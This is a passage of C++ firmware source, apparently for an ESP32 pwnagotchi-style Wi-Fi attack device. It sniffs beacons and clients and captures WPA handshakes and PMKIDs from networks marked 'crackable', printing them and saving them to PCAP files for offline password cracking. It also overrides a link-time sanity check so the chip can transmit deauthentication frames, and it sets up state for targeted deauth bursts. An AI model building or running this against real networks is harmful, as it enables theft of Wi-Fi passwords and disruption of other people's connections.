#include "sniffer.h"
#include "config.h"

#include <Arduino.h>
#include <WiFi.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <SPI.h>
#include <SD.h>
#include <strings.h>
#include <freertos/FreeRTOS.h>
#include <freertos/queue.h>

// Some ESP-IDF builds refuse to transmit deauth/disassoc frames from
// esp_wifi_80211_tx(). ESP32 Marauder and friends override this check at link
// time. The build uses -zmuldefs so this definition wins. If the linker still
// uses the library copy, boost mode reports an error instead of pretending.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  (void)arg;
  (void)arg2;
  (void)arg3;
  return 0;
}

// ---------------------------------------------------------------- types
enum PktKind : uint8_t { PKT_BEACON = 1, PKT_EAPOL = 2, PKT_ASSOC = 3 };

enum ClientObsKind : uint8_t { OBS_DATA = 1, OBS_ASSOC = 2 };

enum ClientFlags : uint8_t {
  CLIENT_DATA  = 1 << 0,
  CLIENT_ASSOC = 1 << 1,
};

enum EapolEvent : uint8_t {
  EVENT_HS    = 1 << 0,
  EVENT_PMKID = 1 << 1,
};

struct Pkt {
  uint16_t len;
  uint16_t origLen;
  int8_t rssi;
  uint8_t channel;
  uint8_t kind;
  uint8_t data[MAX_FRAME];
};

struct ClientObs {
  uint8_t client[6];
  uint8_t ap[6];
  int8_t rssi;
  uint8_t channel;
  uint8_t kind;
};

struct ClientInfo {
  bool used;
  uint8_t mac[6];
  uint8_t ap[6];
  int8_t rssi;
  uint8_t channel;
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t observations;
  uint8_t flags;
};

struct HsEntry {
  bool used;
  uint8_t ap[6];
  uint8_t sta[6];
  bool m1, m2, m3, m4;
  bool reported;
  bool pmkidReported;
  uint64_t m1Replay, m2Replay, m3Replay;
  uint32_t last;
};

struct BeaconSeen {
  bool used;
  uint8_t bssid[6];
  uint32_t last;
};

struct AssocSeen {
  bool used;
  uint8_t sta[6];
  uint32_t last;
};

// ---------------------------------------------------------------- state
static ApInfo g_aps[MAX_APS];
static int g_apCount = 0;

static HsEntry g_hs[MAX_HS];
static BeaconSeen g_bt[64];
static AssocSeen g_as[16];

static ClientInfo g_clients[MAX_CLIENTS];
static int g_clientCount = 0;
static uint32_t g_lastClientSample = 0;
static uint32_t g_lastClientCleanup = 0;
static volatile uint32_t g_clientDrops = 0;

static int g_hsCount = 0;
static int g_savedHsCount = 0;
static int g_pmkidCount = 0;
static int g_savedPmkidCount = 0;
static int g_eapolCount = 0;
static volatile uint32_t g_drops = 0;

// The skip list is stored in NVS, never in the repository.
static char g_skipSsids[MAX_SKIP_SSIDS][33];
static int g_skipCount = 0;
static Preferences g_prefs;
static bool g_prefsOk = false;

static bool g_sdOk = false;
static bool g_pcapOk = false;
static File g_pcap;
static char g_pcapPath[32] = "";
static uint32_t g_pcapSize = 0;
static uint32_t g_lastSdTry = 0;
static uint32_t g_lastFlush = 0;

static bool g_paused = false;
static bool g_lockMode = false;
static uint8_t g_lockChannel = 6;
static uint8_t g_channel = 0;
static uint32_t g_lastHop = 0;

static bool g_debugRaw = false;
static bool g_debugParse = false;
static uint8_t g_debugBssid[6];

static bool g_boost = false;
static bool g_boostBroadcast = false;
static bool g_hasTarget = false;
static uint8_t g_targetBssid[6];
static char g_targetSsid[33];
static uint8_t g_targetChannel = 0;
static int8_t g_targetRssi = 0;
static uint8_t g_targetAuth = AUTH_UNKNOWN;
static bool g_targetPmfRequired = false;
static bool g_targetSkipped = false;

static uint32_t g_lastDeauth = 0;
static uint32_t g_deauthSent = 0;
static uint32_t g_deauthBursts = 0;
static uint16_t g_deauthSeq = 0;

static uint8_t g_deauthClient[6];
static uint8_t g_deauthBurstLeft = 0;
static uint8_t g_deauthDir = 0;
static uint32_t g_deauthNextAt = 0;
static uint32_t g_deauthBurstsDone = 0;
static bool g_deauthWaitingReported = false;

static QueueHandle_t g_queue = nullptr;
static QueueHandle_t g_clientQueue = nullptr;

static const uint8_t HOP_CHANNELS[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
static int g_hopIdx = 0;

// ---------------------------------------------------------------- small helpers
static void macStr(const uint8_t *m, char *out) {
  snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void jsonEscape(const char *in, char *out, size_t outLen) {
  size_t j = 0;
  for (size_t i = 0; in[i] && j + 1 < outLen; i++) {
    uint8_t c = (uint8_t)in[i];
    if (c == '"' || c == '\\') {
      if (j + 2 >= outLen) break;
      out[j++] = '\\';
      out[j++] = (char)c;
    } else if (c < 0x20 || c == 0x7F) {
      if (j + 6 >= outLen) break;
      snprintf(out + j, outLen - j, "\\u%04x", c);
      j += 6;
    } else {
      out[j++] = (char)c;
    }
  }
  out[j] = 0;
}

static bool sameMac(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static bool isZeroMac(const uint8_t *a) {
  static const uint8_t z[6] = {0, 0, 0, 0, 0, 0};
  return sameMac(a, z);
}

static bool isGroupMac(const uint8_t *a) {
  return (a[0] & 0x01) != 0;
}

static bool isSkippedSsid(const char *ssid) {
  if (!ssid || !ssid[0]) return false;
  for (int i = 0; i < g_skipCount; i++) {
    if (strcmp(ssid, g_skipSsids[i]) == 0) return true;
  }
  return false;
}

static void loadSkipList() {
  g_skipCount = 0;
  if (!g_prefs.begin("pwnagotchi", false)) {
    g_prefsOk = false;
    return;
  }
  g_prefsOk = true;
  String saved = g_prefs.getString("skips", "");
  int start = 0;
  while (start < (int)saved.length() && g_skipCount < MAX_SKIP_SSIDS) {
    int end = saved.indexOf('\n', start);
    if (end < 0) end = saved.length();
    int n = end - start;
    if (n > 0) {
      if (n > 32) n = 32;
      memcpy(g_skipSsids[g_skipCount], saved.c_str() + start, n);
      g_skipSsids[g_skipCount][n] = 0;
      g_skipCount++;
    }
    start = end + 1;
  }
}

static void saveSkipList() {
  if (!g_prefsOk) return;
  String out;
  for (int i = 0; i < g_skipCount; i++) {
    if (i) out += '\n';
    out += g_skipSsids[i];
  }
  g_prefs.putString("skips", out);
}

static void refreshApSkips() {
  for (int i = 0; i < g_apCount; i++) {
    g_aps[i].skipped = isSkippedSsid(g_aps[i].ssid);
  }
}

bool snifferSkipAdd(const char *ssid) {
  if (!ssid || !ssid[0]) {
    Serial.println("{\"t\":\"error\",\"msg\":\"empty SSID\"}");
    return false;
  }
  if (strlen(ssid) > 32) {
    Serial.println("{\"t\":\"error\",\"msg\":\"SSID longer than 32 bytes\"}");
    return false;
  }
  if (isSkippedSsid(ssid)) {
    Serial.println("{\"t\":\"skip\",\"add\":1,\"exists\":1}");
    return true;
  }
  if (g_skipCount >= MAX_SKIP_SSIDS) {
    Serial.println("{\"t\":\"error\",\"msg\":\"skip list full\"}");
    return false;
  }
  strlcpy(g_skipSsids[g_skipCount], ssid, sizeof(g_skipSsids[0]));
  g_skipCount++;
  saveSkipList();
  refreshApSkips();

  char esc[80];
  jsonEscape(ssid, esc, sizeof(esc));
  Serial.printf("{\"t\":\"skip\",\"add\":1,\"ssid\":\"%s\",\"count\":%d}\n",
                esc, g_skipCount);
  return true;
}

bool snifferSkipDel(const char *ssid) {
  if (!ssid || !ssid[0]) {
    Serial.println("{\"t\":\"error\",\"msg\":\"empty SSID\"}");
    return false;
  }
  int found = -1;
  for (int i = 0; i < g_skipCount; i++) {
    if (strcmp(ssid, g_skipSsids[i]) == 0) {
      found = i;
      break;
    }
  }
  if (found < 0) {
    Serial.println("{\"t\":\"error\",\"msg\":\"SSID is not in the skip list\"}");
    return false;
  }
  for (int i = found; i + 1 < g_skipCount; i++) {
    strlcpy(g_skipSsids[i], g_skipSsids[i + 1], sizeof(g_skipSsids[0]));
  }
  g_skipCount--;
  g_skipSsids[g_skipCount][0] = 0;
  saveSkipList();
  refreshApSkips();

  char esc[80];
  jsonEscape(ssid, esc, sizeof(esc));
  Serial.printf("{\"t\":\"skip\",\"del\":1,\"ssid\":\"%s\",\"count\":%d}\n",
                esc, g_skipCount);
  return true;
}

bool snifferSkipClear() {
  g_skipCount = 0;
  for (int i = 0; i < MAX_SKIP_SSIDS; i++) g_skipSsids[i][0] = 0;
  saveSkipList();
  refreshApSkips();
  Serial.println("{\"t\":\"skip\",\"clear\":1,\"count\":0}");
  return true;
}

static bool timeReached(uint32_t now, uint32_t target) {
  return (int32_t)(now - target) >= 0;
}

// ---------------------------------------------------------------- auth parsing
struct RsnInfo {
  uint8_t auth;
  bool pmfCapable;
  bool pmfRequired;
};

static RsnInfo parseRsn(const uint8_t *ie, int len) {
  // version(2) group(4) pairwise-count(2) pairwise(n*4) akm-count(2) akm(n*4)
  // then RSN capabilities (2) and optional PMKID count/list.
  RsnInfo info = {AUTH_WPA2, false, false};
  if (len < 8) return info;
  int pos = 2 + 4;
  if (pos + 2 > len) return info;
  int pairwise = ie[pos] | (ie[pos + 1] << 8);
  if (pairwise > 32) return info;
  pos += 2;
  if (pos + pairwise * 4 > len) return info;
  pos += pairwise * 4;
  if (pos + 2 > len) return info;
  int akmCount = ie[pos] | (ie[pos + 1] << 8);
  pos += 2;
  if (akmCount > 32 || pos + akmCount * 4 > len) return info;

  bool psk = false, sae = false, eap = false;
  for (int i = 0; i < akmCount; i++, pos += 4) {
    if (ie[pos] != 0x00 || ie[pos + 1] != 0x0F || ie[pos + 2] != 0xAC) continue;
    uint8_t t = ie[pos + 3];
    if (t == 2 || t == 4 || t == 6) psk = true;
    else if (t == 8 || t == 9 || t == 24 || t == 26) sae = true;
    else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) eap = true;
  }

  if (pos + 2 <= len) {
    uint16_t caps = (uint16_t)ie[pos] | ((uint16_t)ie[pos + 1] << 8);
    info.pmfCapable = (caps & 0x0040) != 0;
    info.pmfRequired = (caps & 0x0080) != 0;
  }

  if (psk && sae) info.auth = AUTH_WPA2_3;
  else if (sae) info.auth = AUTH_WPA3;
  else if (psk) info.auth = AUTH_WPA2;
  else if (eap) info.auth = AUTH_EAP;
  return info;
}

const char *authName(uint8_t a) {
  switch (a) {
    case AUTH_OPEN: return "OPEN";
    case AUTH_WEP: return "WEP";
    case AUTH_WPA: return "WPA";
    case AUTH_WPA2: return "WPA2";
    case AUTH_WPA2_3: return "WPA2/3";
    case AUTH_WPA3: return "WPA3";
    case AUTH_EAP: return "EAP";
    default: return "?";
  }
}

bool isCrackableAuth(uint8_t a) {
  return a == AUTH_WPA || a == AUTH_WPA2 || a == AUTH_WPA2_3;
}

// ---------------------------------------------------------------- AP table
static ApInfo *findAp(const uint8_t *bssid) {
  for (int i = 0; i < g_apCount; i++) {
    if (sameMac(g_aps[i].bssid, bssid)) return &g_aps[i];
  }
  return nullptr;
}

static int oldestApIndex() {
  int idx = 0;
  uint32_t best = 0xFFFFFFFF;
  for (int i = 0; i < g_apCount; i++) {
    if (g_aps[i].lastSeen < best) {
      best = g_aps[i].lastSeen;
      idx = i;
    }
  }
  return idx;
}

static void emitAp(const ApInfo &ap, bool isNew) {
  char ssid[80];
  char bssid[18];
  jsonEscape(ap.ssid, ssid, sizeof(ssid));
  macStr(ap.bssid, bssid);
  const char *pmf = ap.pmfRequired ? "R" : (ap.pmfCapable ? "C" : ".");
  Serial.printf("{\"t\":\"ap\",\"new\":%d,\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"enc\":\"%s\",\"pmf\":\"%s\",\"skip\":%d}\n",
                isNew ? 1 : 0, ssid, bssid, ap.channel, ap.rssi, authName(ap.auth),
                pmf, ap.skipped ? 1 : 0);
}

static void updateAp(const uint8_t *bssid, const char *ssid, int ssidLen,
                     uint8_t channel, int8_t rssi, uint8_t auth, bool hidden,
                     bool truncated, bool pmfCapable, bool pmfRequired) {
  ApInfo *ap = findAp(bssid);
  bool isNew = false;

  if (!ap) {
    if (g_apCount < MAX_APS) {
      ap = &g_aps[g_apCount++];
    } else {
      ap = &g_aps[oldestApIndex()];
    }
    memset(ap, 0, sizeof(*ap));
    memcpy(ap->bssid, bssid, 6);
    ap->firstSeen = millis();
    isNew = true;
  }

  if (ssidLen > 0 && !hidden) {
    int n = ssidLen;
    if (n > 32) n = 32;
    memcpy(ap->ssid, ssid, n);
    ap->ssid[n] = 0;
    ap->ssidLen = (uint8_t)n;
    ap->hidden = false;
  } else if (isNew) {
    ap->ssid[0] = 0;
    ap->ssidLen = 0;
    ap->hidden = true;
  }

  ap->channel = channel ? channel : ap->channel;
  ap->rssi = rssi;

  // A truncated beacon can lose the RSN IE. Do not downgrade a known AP to
  // OPEN or WEP because the frame was cut off at MAX_FRAME.
  if (!truncated) {
    ap->auth = auth;
    ap->pmfCapable = pmfCapable;
    ap->pmfRequired = pmfRequired;
  } else if (isNew) {
    ap->auth = AUTH_UNKNOWN;
  }

  ap->skipped = isSkippedSsid(ap->ssid);
  ap->lastSeen = millis();
  if (ap->beacons < 0xFFFF) ap->beacons++;

  if (isNew) {
    emitAp(*ap, true);
  }
}

// ---------------------------------------------------------------- pcap
static int nextPcapIndex() {
  int next = 1;
  File root = SD.open("/");
  if (!root) return next;

  File f = root.openNextFile();
  while (f) {
    if (!f.isDirectory()) {
      const char *name = f.name();
      const char *p = strstr(name, "pwn_");
      int n = 0;
      if (p && sscanf(p, "pwn_%d.pcap", &n) == 1 && n >= next) {
        next = n + 1;
      }
    }
    f.close();
    f = root.openNextFile();
  }
  root.close();
  return next;
}

static void pcapOpen() {
  if (g_pcapOk || !g_sdOk) return;

  bool reuse = (g_pcapPath[0] != 0);
  if (!reuse) {
    int idx = nextPcapIndex();
    snprintf(g_pcapPath, sizeof(g_pcapPath), "/pwn_%03d.pcap", idx);
  }

  // Reopen the same file after a pause so one session stays in one PCAP.
  g_pcap = SD.open(g_pcapPath, reuse ? FILE_APPEND : FILE_WRITE);
  if (!g_pcap) {
    g_sdOk = false;
    return;
  }

  size_t existing = reuse ? g_pcap.size() : 0;
  if (existing < 24) {
    if (reuse) {
      // A short file cannot be appended in place. Recreate its header.
      g_pcap.close();
      g_pcap = SD.open(g_pcapPath, FILE_WRITE);
      if (!g_pcap) {
        g_sdOk = false;
        return;
      }
    }

    uint32_t magic = 0xA1B2C3D4;
    uint16_t major = 2, minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0, snaplen = 65535, network = 127;  // LINKTYPE_IEEE802_11_RADIOTAP
    g_pcap.write((const uint8_t *)&magic, 4);
    g_pcap.write((const uint8_t *)&major, 2);
    g_pcap.write((const uint8_t *)&minor, 2);
    g_pcap.write((const uint8_t *)&thiszone, 4);
    g_pcap.write((const uint8_t *)&sigfigs, 4);
    g_pcap.write((const uint8_t *)&snaplen, 4);
    g_pcap.write((const uint8_t *)&network, 4);
    g_pcapSize = 24;
  } else {
    g_pcapSize = (uint32_t)existing;
  }
  g_pcapOk = true;
}

// Minimal radiotap header: flags, rate, channel, and antenna signal.
// Link type 127 keeps the channel and RSSI with every frame, so a capture
// taken while hopping can still be split per channel later.
static int buildRadiotap(uint8_t *rt, uint8_t channel, int8_t rssi) {
  uint32_t present = (1u << 1) | (1u << 2) | (1u << 3) | (1u << 5);
  uint16_t freq = (uint16_t)(2407 + 5 * (channel ? channel : 1));
  uint16_t chanFlags = 0x00A0;  // 2 GHz, OFDM
  rt[0] = 0;                    // version
  rt[1] = 0;                    // pad
  rt[2] = 15;                   // header length
  rt[3] = 0;
  memcpy(rt + 4, &present, 4);
  rt[8] = 0x00;                 // flags: FCS not included
  rt[9] = 0x0C;                 // 6 Mb/s
  memcpy(rt + 10, &freq, 2);
  memcpy(rt + 12, &chanFlags, 2);
  rt[14] = (uint8_t)rssi;
  return 15;
}

static bool pcapWrite(const Pkt &pkt) {
  if (!g_pcapOk) return false;

  uint8_t rt[15];
  int rtLen = buildRadiotap(rt, pkt.channel, pkt.rssi);

  uint64_t us = esp_timer_get_time();
  uint32_t sec = (uint32_t)(us / 1000000ULL);
  uint32_t usec = (uint32_t)(us % 1000000ULL);
  uint32_t incl = (uint32_t)(rtLen + pkt.len);
  uint32_t orig = (uint32_t)(rtLen + (pkt.origLen ? pkt.origLen : pkt.len));

  uint8_t rec[15 + 16 + MAX_FRAME];
  memcpy(rec, rt, rtLen);
  memcpy(rec + rtLen, &sec, 4);
  memcpy(rec + rtLen + 4, &usec, 4);
  memcpy(rec + rtLen + 8, &incl, 4);
  memcpy(rec + rtLen + 12, &orig, 4);
  memcpy(rec + rtLen + 16, pkt.data, pkt.len);

  size_t total = (size_t)rtLen + 16 + pkt.len;
  size_t n = g_pcap.write(rec, total);
  if (n != total) {
    g_pcap.close();
    g_pcapOk = false;
    g_sdOk = false;
    return false;
  }
  g_pcapSize += (uint32_t)n;
  return true;
}

static void pcapFlush() {
  if (g_pcapOk && g_pcap) {
    g_pcap.flush();
    g_lastFlush = millis();
  }
}

static void pcapClose() {
  if (g_pcapOk && g_pcap) {
    g_pcap.flush();
    g_pcap.close();
  }
  g_pcapOk = false;
}

// ---------------------------------------------------------------- SD
static void sdTry() {
  if (g_sdOk) return;
  if (SD.begin(PIN_SD_CS, SPI, 20000000) && SD.cardType() != CARD_NONE) {
    g_sdOk = true;
    pcapOpen();
    Serial.printf("{\"t\":\"sd\",\"ok\":1,\"pcap\":%u}\n", (unsigned)g_pcapSize);
  } else {
    SD.end();
    g_sdOk = false;
  }
}

// ---------------------------------------------------------------- beacon processing
static void processBeacon(const uint8_t *p, int len, int origLen, int8_t rssi, uint8_t ch) {
  if (len < 36) return;

  const uint8_t *bssid = p + 10;
  if (g_debugRaw && sameMac(bssid, g_debugBssid)) {
    g_debugRaw = false;
    char bssidStr[18];
    macStr(bssid, bssidStr);
    int n = len > 160 ? 160 : len;
    char hex[321];
    for (int i = 0; i < n; i++) {
      snprintf(hex + i * 2, 3, "%02x", p[i]);
    }
    hex[n * 2] = 0;
    Serial.printf("{\"t\":\"raw\",\"bssid\":\"%s\",\"len\":%d,\"hex\":\"%s\"}\n",
                  bssidStr, len, hex);
  }

  uint16_t cap = (uint16_t)p[34] | ((uint16_t)p[35] << 8);
  bool privacy = (cap & 0x0010) != 0;

  char ssid[33] = {0};
  int ssidLen = 0;
  int dsCh = 0;
  bool rsnSeen = false, wpa = false;
  RsnInfo rsn = {AUTH_WPA2, false, false};

  int pos = 36;
  int ieCount = 0;
  bool complete = true;
  while (pos + 2 <= len) {
    uint8_t id = p[pos];
    uint8_t l = p[pos + 1];
    if (pos + 2 + l > len) {
      complete = false;
      break;
    }
    const uint8_t *ie = p + pos + 2;
    ieCount++;

    if (id == 0) {
      // Some frames carry an extra empty SSID element after the real one.
      // Never let it erase an SSID we already parsed.
      if (l > 0 && l <= 32) {
        memcpy(ssid, ie, l);
        ssidLen = l;
      }
    } else if (id == 3) {
      if (l >= 1) dsCh = ie[0];
    } else if (id == 48) {
      rsnSeen = true;
      rsn = parseRsn(ie, l);
    } else if (id == 221) {
      if (l >= 4 && ie[0] == 0x00 && ie[1] == 0x50 && ie[2] == 0xF2 && ie[3] == 0x01) {
        wpa = true;
      }
    }
    pos += 2 + l;
  }
  ssid[ssidLen] = 0;

  bool truncated = (origLen > len) || !complete;
  uint8_t auth;
  if (rsnSeen) auth = rsn.auth;
  else if (wpa) auth = AUTH_WPA;
  else if (privacy) auth = AUTH_WEP;
  else auth = AUTH_OPEN;

  updateAp(bssid, ssid, ssidLen, dsCh ? (uint8_t)dsCh : ch, rssi, auth,
           ssidLen == 0, truncated, rsnSeen && rsn.pmfCapable,
           rsnSeen && rsn.pmfRequired);

  if (g_debugParse && sameMac(bssid, g_debugBssid)) {
    g_debugParse = false;
    ApInfo *a = findAp(bssid);
    Serial.printf("{\"t\":\"parsedbg\",\"inLen\":%d,\"inSsid\":\"%.32s\","
                  "\"storedLen\":%d,\"stored\":\"%.32s\",\"hidden\":%d,"
                  "\"ies\":%d,\"b36\":%02x,\"b37\":%02x,\"b38\":%02x,\"end\":%d,\"trunc\":%d}\n",
                  ssidLen, ssid, a ? a->ssidLen : -1,
                  a ? a->ssid : "", a ? (a->hidden ? 1 : 0) : -1,
                  ieCount, p[36], p[37], p[38], pos, truncated ? 1 : 0);
  }
}

// ---------------------------------------------------------------- EAPOL
static HsEntry *hsGet(const uint8_t *ap, const uint8_t *sta) {
  int freeIdx = -1;
  int oldest = 0;
  uint32_t oldestT = 0xFFFFFFFF;

  for (int i = 0; i < MAX_HS; i++) {
    if (!g_hs[i].used) {
      if (freeIdx < 0) freeIdx = i;
      continue;
    }
    if (sameMac(g_hs[i].ap, ap) && sameMac(g_hs[i].sta, sta)) return &g_hs[i];
    if (g_hs[i].last < oldestT) {
      oldestT = g_hs[i].last;
      oldest = i;
    }
  }

  int idx = (freeIdx >= 0) ? freeIdx : oldest;
  HsEntry *e = &g_hs[idx];
  memset(e, 0, sizeof(*e));
  e->used = true;
  memcpy(e->ap, ap, 6);
  memcpy(e->sta, sta, 6);
  return e;
}

static void markApFlag(const uint8_t *bssid, bool handshake, bool pmkid) {
  ApInfo *ap = findAp(bssid);
  if (!ap) return;
  if (handshake) ap->handshake = true;
  if (pmkid) ap->pmkid = true;
}

static int eapolMessage(const uint8_t *eapol, int eapolLen, const uint8_t **pmkid,
                        uint64_t *replay) {
  *pmkid = nullptr;
  *replay = 0;
  if (eapolLen < 99) return 0;
  if (eapol[1] != 3) return 0;  // EAPOL-Key

  for (int i = 0; i < 8; i++) {
    *replay |= ((uint64_t)eapol[9 + i]) << (8 * i);
  }

  uint16_t ki = (uint16_t)eapol[5] | ((uint16_t)eapol[6] << 8);
  bool pairwise = (ki & 0x0008) != 0;
  if (!pairwise) return 0;  // group handshake is not useful for PSK cracking

  bool install = (ki & 0x0010) != 0;
  bool ack = (ki & 0x0020) != 0;
  bool mic = (ki & 0x0040) != 0;
  bool secure = (ki & 0x0080) != 0;

  int msg = 0;
  if (ack && !mic && !install) msg = 1;
  else if (!ack && mic && !install && !secure) msg = 2;
  else if (ack && mic && install) msg = 3;
  else if (!ack && mic && !install && secure) msg = 4;

  int kdLen = (int)eapol[97] | ((int)eapol[98] << 8);
  if (kdLen > 0 && 99 + kdLen <= eapolLen) {
    const uint8_t *kd = eapol + 99;
    int pos = 0;
    while (pos + 2 <= kdLen) {
      uint8_t t = kd[pos];
      uint8_t l = kd[pos + 1];
      if (pos + 2 + l > kdLen) break;
      const uint8_t *d = kd + pos + 2;
      if (t == 0xDD && l >= 20 &&
          d[0] == 0x00 && d[1] == 0x0F && d[2] == 0xAC && d[3] == 0x04) {
        *pmkid = d + 4;
        break;
      }
      pos += 2 + l;
    }
  }
  return msg;
}

static uint8_t processEapol(const uint8_t *p, int len, int8_t rssi, uint8_t ch,
                            uint8_t apOut[6]) {
  (void)rssi;
  (void)ch;
  if (apOut) memset(apOut, 0, 6);
  if (len < 24) return 0;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (((fc0 >> 2) & 0x03) != 2) return 0;  // data frame

  bool toDS = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  int hdr = 24;
  if (toDS && fromDS) hdr += 6;
  if (subtype & 0x08) hdr += 2;  // QoS control
  if ((subtype & 0x08) && (fc1 & 0x80)) hdr += 4;  // HT control
  if (hdr + 8 > len) return 0;

  const uint8_t *llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) {
    return 0;
  }

  const uint8_t *eapol = llc + 8;
  int avail = len - hdr - 8;
  if (avail < 4) return 0;
  int eapolTotal = 4 + ((int)eapol[2] | ((int)eapol[3] << 8));
  if (eapolTotal > avail) eapolTotal = avail;

  const uint8_t *pmkid = nullptr;
  uint64_t replay = 0;
  int msg = eapolMessage(eapol, eapolTotal, &pmkid, &replay);
  if (!msg) return 0;

  const uint8_t *ap;
  const uint8_t *sta;
  if (fromDS && !toDS) {
    ap = p + 10;   // addr2
    sta = p + 4;   // addr1
  } else if (toDS && !fromDS) {
    ap = p + 4;    // addr1
    sta = p + 10;  // addr2
  } else {
    return 0;  // IBSS / WDS
  }
  if (isGroupMac(ap) || isGroupMac(sta) || isZeroMac(ap) || isZeroMac(sta)) return 0;
  if (apOut) memcpy(apOut, ap, 6);

  uint8_t events = 0;
  g_eapolCount++;

  char apStr[18], staStr[18];
  macStr(ap, apStr);
  macStr(sta, staStr);
  Serial.printf("{\"t\":\"eapol\",\"ap\":\"%s\",\"sta\":\"%s\",\"msg\":%d}\n",
                apStr, staStr, msg);

  HsEntry *e = hsGet(ap, sta);
  e->last = millis();

  if (msg == 1) {
    // A new replay counter means a new handshake attempt. Re-arm the pair so
    // a later reconnect can be captured and counted again.
    if (e->m1 && e->m1Replay != replay) {
      e->m2 = e->m3 = e->m4 = false;
      e->m2Replay = e->m3Replay = 0;
      e->reported = false;
      e->pmkidReported = false;
    }
    e->m1 = true;
    e->m1Replay = replay;
  } else if (msg == 2) {
    e->m2 = true;
    e->m2Replay = replay;
  } else if (msg == 3) {
    e->m3 = true;
    e->m3Replay = replay;
  } else if (msg == 4) {
    e->m4 = true;
  }

  bool validHs =
      (e->m1 && e->m2 && e->m1Replay == e->m2Replay) ||
      (e->m2 && e->m3 && e->m3Replay == e->m2Replay + 1);

  if (!e->reported && validHs) {
    e->reported = true;
    events |= EVENT_HS;
    g_hsCount++;
    markApFlag(ap, true, false);

    char ssid[80] = "";
    ApInfo *ai = findAp(ap);
    if (ai) jsonEscape(ai->ssid, ssid, sizeof(ssid));
    Serial.printf("{\"t\":\"hs\",\"ap\":\"%s\",\"ssid\":\"%s\",\"ch\":%d,\"count\":%d}\n",
                  apStr, ssid, g_channel, g_hsCount);
  }

  if (pmkid && !e->pmkidReported) {
    e->pmkidReported = true;
    events |= EVENT_PMKID;
    g_pmkidCount++;
    markApFlag(ap, false, true);

    char pm[33];
    for (int i = 0; i < 16; i++) snprintf(pm + i * 2, 3, "%02x", pmkid[i]);

    char ssid[80] = "";
    ApInfo *ai = findAp(ap);
    if (ai) jsonEscape(ai->ssid, ssid, sizeof(ssid));
    Serial.printf("{\"t\":\"pmkid\",\"ap\":\"%s\",\"ssid\":\"%s\",\"pmkid\":\"%s\",\"count\":%d,\"src\":\"m1\"}\n",
                  apStr, ssid, pm, g_pmkidCount);
  }

  return events;
}

// ---------------------------------------------------------------- clients
static ClientInfo *findClient(const uint8_t *mac) {
  for (int i = 0; i < g_clientCount; i++) {
    if (g_clients[i].used && sameMac(g_clients[i].mac, mac)) return &g_clients[i];
  }
  return nullptr;
}

static int oldestClientIndex() {
  int idx = 0;
  uint32_t best = 0xFFFFFFFF;
  for (int i = 0; i < g_clientCount; i++) {
    if (g_clients[i].used && g_clients[i].lastSeen < best) {
      best = g_clients[i].lastSeen;
      idx = i;
    }
  }
  return idx;
}

static void emitClient(const ClientInfo &c) {
  char mac[18], ap[18];
  macStr(c.mac, mac);
  macStr(c.ap, ap);
  Serial.printf("{\"t\":\"client\",\"new\":1,\"mac\":\"%s\",\"ap\":\"%s\",\"ch\":%d,\"rssi\":%d}\n",
                mac, ap, c.channel, c.rssi);
}

static void updateClient(const ClientObs &o) {
  ClientInfo *c = findClient(o.client);
  bool isNew = false;
  if (!c) {
    for (int i = 0; i < g_clientCount; i++) {
      if (!g_clients[i].used) {
        c = &g_clients[i];
        break;
      }
    }
    if (!c) {
      if (g_clientCount < MAX_CLIENTS) {
        c = &g_clients[g_clientCount++];
      } else {
        c = &g_clients[oldestClientIndex()];
      }
    }
    memset(c, 0, sizeof(*c));
    c->used = true;
    memcpy(c->mac, o.client, 6);
    c->firstSeen = millis();
    isNew = true;
  }

  memcpy(c->ap, o.ap, 6);
  c->rssi = o.rssi;
  c->channel = o.channel;
  c->lastSeen = millis();
  if (c->observations < 0xFFFF) c->observations++;
  c->flags |= (o.kind == OBS_ASSOC) ? CLIENT_ASSOC : CLIENT_DATA;

  if (isNew) emitClient(*c);
}

static void cleanupStaleClients() {
  uint32_t now = millis();
  if (now - g_lastClientCleanup < 5000) return;
  g_lastClientCleanup = now;
  for (int i = 0; i < g_clientCount; i++) {
    if (g_clients[i].used && now - g_clients[i].lastSeen > CLIENT_STALE_MS) {
      g_clients[i].used = false;
    }
  }
}

static void clientObserve(const uint8_t *sta, const uint8_t *ap, int8_t rssi,
                          uint8_t ch, uint8_t kind) {
  if (!g_clientQueue) return;
  if (isGroupMac(sta) || isZeroMac(sta) || isGroupMac(ap) || isZeroMac(ap)) return;

  ClientObs o;
  memcpy(o.client, sta, 6);
  memcpy(o.ap, ap, 6);
  o.rssi = rssi;
  o.channel = ch;
  o.kind = kind;
  if (xQueueSend(g_clientQueue, &o, 0) != pdTRUE) {
    g_clientDrops++;
  }
}

static int parseRsnPmkids(const uint8_t *ie, int len, const uint8_t **list) {
  *list = nullptr;
  int pos = 2 + 4;  // version + group cipher
  if (pos + 2 > len) return 0;
  int pairwise = ie[pos] | (ie[pos + 1] << 8);
  if (pairwise > 32) return 0;
  pos += 2;
  if (pos + pairwise * 4 > len) return 0;
  pos += pairwise * 4;
  if (pos + 2 > len) return 0;
  int akmCount = ie[pos] | (ie[pos + 1] << 8);
  if (akmCount > 32) return 0;
  pos += 2;
  if (pos + akmCount * 4 > len) return 0;
  pos += akmCount * 4;
  if (pos + 2 > len) return 0;
  pos += 2;  // RSN capabilities
  if (pos + 2 > len) return 0;
  int count = ie[pos] | (ie[pos + 1] << 8);
  pos += 2;
  if (count <= 0 || pos + count * 16 > len) return 0;
  if (count > 4) count = 4;
  *list = ie + pos;
  return count;
}

